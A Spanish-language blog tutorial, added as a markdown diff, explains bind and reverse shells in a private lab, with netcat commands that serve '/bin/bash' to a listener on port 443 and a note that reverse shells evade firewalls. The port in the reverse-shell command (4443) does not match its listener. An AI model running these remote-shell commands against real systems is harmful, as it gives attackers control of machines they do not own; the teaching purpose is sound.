@@ -1,0 +1,87 @@
+---
+title: Tipos de Shell
+author: nf4ll
+date: 2022-10-01 14:35:24 +0000
+categories: [Tutotial, Shells]
+tags: [Scripting]
+math: true
+mermaid: true
+image:
+  path: /assets/img/posts/Shells/DifferentShells.PNG
+  width: 757
+  height: 585
+---
+# Qué es una shell
+
+Una shell es un intérprete de comandos que proporciona al usuario una interfaz para ejecutar comandos de una manera sencilla. Cada sistema operativo tiene su propio intérprete de comandos, en Windows tenemos CMD. En los sistemas operativos basados en GNU/Linux, a diferencia de Windows, por defecto solemos tener como intérprete de comandos una Bash, pero también disponemos de otras como pueden ser una Zsh, que por defecto viene en Kali o una shell más básica como puede ser sh.
+
+## Laboratorio
+
+El laboratorio está compuesto de dos máquinas, la máquina atacante 192.168.1.101 (Parrot) y una máquina víctima 192.168.1.102 (Ubuntu 18.04). La máquina atacante posteriormente la llamaremos la máquina A mientras que la máquina víctima la llamaremos máquina B.
+
+# Shells en hacking
+
+En ciberseguridad a la hora de comprometer un sistema, tenemos varias fases. Una de esas fases se llama post-explotación, esta es la fase donde se ha comprometido la máquina, por lo que trataremos de escalar privilegios. Antes de saltar a ese paso vamos a obtener una shell de ese sistema para posteriormente terminar de realizar la escalada. Existen dos tipos de shell, que veremos a continuación.
+
+## Bind Shell
+
+Para obtener este tipo de shell, se realiza a través de una conexión directa, es decir, la máquina A se conecta a la máquina B. La máquina B estará en escucha y con una shell a la espera para cuando la máquina A se conecte.
+
+![Desktop View](/assets/img/posts/Shells/bindShell.PNG)
+
+### Ejemplo práctico
+
+En primer lugar se realizaría la explotación y una vez que estamos dentro de la víctima, ejecutaremos el comando `ncat -nvlp 443 -e /bin/bash`. Esto quiere decir que la máquina B se queda en escucha por el puerto 443 y el sistema que se conecte al puerto recibirá una Bash. Es necesario ejecutar la escucha con el comando sudo, por lo que ejecutaríamos la shell siendo el usuario root. A continuación vamos a ver las dos máquinas.
+
+Como hemos comentado primero la máquina víctima tiene que estar a la escucha. Los parámetros nos indican:
+```bash
+-l #Esta a la escucha
+-n #No realiza resolución DNS
+-v #Verbose
+-p #Indica el puerto sobre el que realizamos la acción
+-e #Ejecuta el programa
+```
+
+En la máquina atacante nos ponemos en escucha con la shell.
+
+![Desktop View](/assets/img/posts/Shells/bindV.PNG)
+
+En la máquina atacante realizamos una conexión indicando la IP y el puerto `nc 192.168.1.102 443`.
+
+![Desktop View](/assets/img/posts/Shells/bindA.PNG)
+
+Cuando realice la conexión ya tendríamos acceso a la máquina de forma remota, como se puede observar en la imagen, que se ejecuta el comando `whoami`. Como se observa tenemos, ejecución de comandos como root, ya que para ejecutar el comando mencionado anteriormente necesitamos privilegios.
+
+## Reverse shell
+
+Este tipo de shell, como bien dice su nombre se obtiene de forma inversa, por lo que la máquina B tendrá que enviar la petición de conexión a la máquina A. La máquina B al realizar la petición de conexión enviará la shell.
+
+![Desktop View](/assets/img/posts/Shells/reverseShell.PNG)
+
+### Ejemplo práctico
+
+Después de realizar la explotación en la máquina A abrimos un puerto a la escucha, concretamente el puerto 443. Después la máquina B enviará la petición de escucha con la shell. Para ponerse a la escucha, la máquina A ejecutará el siguiente comando `nc -nlvp 443`.
+
+![Desktop View](/assets/img/posts/Shells/reverseA1.PNG)
+
+Una vez hemos puesto a la escucha la máquina A, le tocará a la máquina B realizar una petición como la siguiente:
+```bash
+nc 192.168.1.101 4443 -e /bin/bash
+```
+
+![Desktop View](/assets/img/posts/Shells/reverseV.PNG)
+
+Recibimos la shell y tendríamos ejecución de comandos como usuario "ubuntu". A partir de aquí tendríamos que realizar la escalada de privilegios.
+
+![Desktop View](/assets/img/posts/Shells/reverseA2.PNG)
+
+Este tipo de Shell se puede obtener de muchas formas, como puede ser en una ejecución remota de comandos o cualquier vulnerabilidad que permita ejecutar comandos.
+
+Para más reverse shell:
+<https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>
+
+## Extra
+Las shell pueden ir cifradas usando el parámetro `--ssl`, aunque también se puede realizar la conexión con otras aplicaciones, como por ejemplo Socat. Con Socat puedes obtener una conexión cifrada, creando manualmente el certificado y para que se valide el cifrado, ambas máquinas deberán tenerlo.
+
+## Conclusión
+Las bind shell es una buena opción cuando la máquina víctima no tiene protecciones ya que en el caso de que existiesen firewalls o alguna medida de seguridad esta petición se bloquearía. Las reverse shell son buenas opciones cuando existen medidas de seguridad, porque un firewall no bloqueará la conexión saliente y se podrá obtener la reverse shell de forma exitosa. Por lo que depende de la situación, una shell será mejor que otra.
